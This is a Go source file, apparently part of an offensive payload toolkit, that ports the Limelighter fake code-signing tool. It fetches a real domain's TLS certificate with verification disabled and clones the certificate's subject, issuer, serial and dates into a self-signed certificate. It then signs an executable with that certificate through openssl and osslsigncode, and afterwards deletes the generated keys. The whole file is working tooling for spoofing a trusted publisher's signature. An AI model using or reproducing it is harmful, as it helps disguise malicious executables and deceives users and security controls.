package tampering

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	crand "math/rand"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/guervild/uru/pkg/logger"

)

type FlagOptions struct {
	outFile   string
	inputFile string
	domain    string
	password  string
	real      string
	verify    string
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

func VarNumberLength(min, max int) string {
	var r string
	crand.Seed(time.Now().UnixNano())
	num := crand.Intn(max-min) + min
	n := num
	r = RandStringBytes(n)
	return r
}
func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[crand.Intn(len(letters))]

	}
	return string(b)
}

func GenerateCert(domain string, inputFile string) error {
	var err error
	rootKey, err := rsa.GenerateKey(rand.Reader, 4096)

	if err != nil {
		return err
	}

	certs, err := GetCertificatesPEM(domain + ":443")
	if err != nil {
		os.Chdir("..")
		foldername := strings.Split(inputFile, ".")
		os.RemoveAll(foldername[0])
		return fmt.Errorf("Error: The domain: " + domain + " does not exist or is not accessible from the host you are compiling on")
	}

	block, _ := pem.Decode([]byte(certs))
	cert, _ := x509.ParseCertificate(block.Bytes)

	err = keyToFile(domain+".key", rootKey)
	if err != nil {
		return err
	}

	SubjectTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Subject.CommonName,
		},
		NotBefore:             cert.NotBefore,
		NotAfter:              cert.NotAfter,
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
	}
	IssuerTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Issuer.CommonName,
		},
		NotBefore: cert.NotBefore,
		NotAfter:  cert.NotAfter,
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &SubjectTemplate, &IssuerTemplate, &rootKey.PublicKey, rootKey)
	if err != nil {
		return err
	}

	err = certToFile(domain+".pem", derBytes)
	if err != nil {
		return err
	}

	return nil
}

func keyToFile(filename string, key *rsa.PrivateKey) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	b, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Unable to marshal RSA private key: %v", err)
		os.Exit(2)
	}
	if err := pem.Encode(file, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: b}); err != nil {
		return err
	}

	return nil
}

func certToFile(filename string, derBytes []byte) error {
	certOut, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("[-] Failed to Open cert.pem for Writing: %s", err)
	}
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
		return fmt.Errorf("[-] Failed to Write Data to cert.pem: %s", err)
	}
	if err := certOut.Close(); err != nil {
		return fmt.Errorf("[-] Error Closing cert.pem: %s", err)
	}

	return nil
}

func GetCertificatesPEM(address string) (string, error) {
	conn, err := tls.Dial("tcp", address, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return "", err
	}
	defer conn.Close()
	var b bytes.Buffer
	for _, cert := range conn.ConnectionState().PeerCertificates {
		err := pem.Encode(&b, &pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert.Raw,
		})
		if err != nil {
			return "", err
		}
	}
	return b.String(), nil
}

func GeneratePFK(password string, domain string) error {
	cmd := exec.Command("openssl", "pkcs12", "-export", "-out", domain+".pfx", "-inkey", domain+".key", "-in", domain+".pem", "-passin", "pass:"+password+"", "-passout", "pass:"+password+"")
	err := cmd.Run()

	if err != nil {
		return fmt.Errorf("cmd.Run() failed with %s\n", err)
	}

	return nil
}

func SignExecutable(password string, pfx string, filein string, fileout string) error {
	cmd := exec.Command("osslsigncode", "sign", "-pkcs12", pfx, "-in", ""+filein+"", "-out", ""+fileout+"", "-pass", ""+password+"")
	err := cmd.Run()

	if err != nil {
		return fmt.Errorf("cmd.Run() failed with %s\n", err)
	}

	return nil
}

func Check(check string) error {

	cmd := exec.Command("osslsigncode", "verify", ""+check+"")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()

	if err != nil {
		return fmt.Errorf("cmd.Run() failed with %s\n", err)
	}

	return nil
}

func Limelighter(inputFile, outFile, domain, password, real, verify string) error {
	//	fmt.Println(`
	//	.____    .__               .____    .__       .__     __
	//	|    |   |__| _____   ____ |    |   |__| ____ |  |___/  |_  ___________
	//	|    |   |  |/     \_/ __ \|    |   |  |/ ___\|  |  \   __\/ __ \_  __ \
	//	|    |___|  |  Y Y  \  ___/|    |___|  / /_/  >   Y  \  | \  ___/|  | \/
	//	|_______ \__|__|_|  /\___  >_______ \__\___  /|___|  /__|  \___  >__|
	//		\/        \/     \/        \/ /_____/      \/          \/
	//							@Tyl0us
	//
	//
	//[*] A Tool for Code Signing... Real and fake`)

	if verify == "" && inputFile == "" && outFile == "" {
		return fmt.Errorf("Error: Please provide a file to sign or a file check")
	}

	if verify == "" && inputFile == "" {
		return fmt.Errorf("Error: Please provide a file to sign")
	}
	if verify == "" && outFile == "" {
		return fmt.Errorf("Error: Please provide a name for the signed file")
	}
	if real == "" && domain == "" && verify == "" {
		return fmt.Errorf("Error: Please specify a valid path to a .pfx file or specify the domain to spoof")
	}

	if verify != "" {
		logger.Logger.Debug().Str("verify", verify).Msg("Checking code signed on file")

		err := Check(verify)

		if err != nil {
			return err
		}
	}

	if real != "" {
		logger.Logger.Debug().Str("input_file", inputFile).Str("real_cert", real).Msg("Signing the input file with a valid cert")

		err := SignExecutable(password, real, inputFile, outFile)
		if err != nil {
			return err
		}
	} else {
		password := VarNumberLength(8, 12)
		pfx := domain + ".pfx"

		logger.Logger.Debug().Str("input_file", inputFile).Msg("Signing the input file with a fake cert")

		err := GenerateCert(domain, inputFile)
		if err != nil {
			return err
		}

		err = GeneratePFK(password, domain)

		if err != nil {
			return err
		}

		err = SignExecutable(password, pfx, inputFile, outFile)
		if err != nil {
			return err
		}
	}
	logger.Logger.Debug().Msg("Cleaning up limelighter files...")

	logger.Logger.Debug().Str("file_to_delete", domain + ".pem").Msg("Deleting")
	os.Remove(domain + ".pem")
	logger.Logger.Debug().Str("file_to_delete", domain + ".key").Msg("Deleting")
	os.Remove(domain + ".key")
	logger.Logger.Debug().Str("file_to_delete", domain + ".pfx").Msg("Deleting")
	os.Remove(domain + ".pfx")

	return nil
}
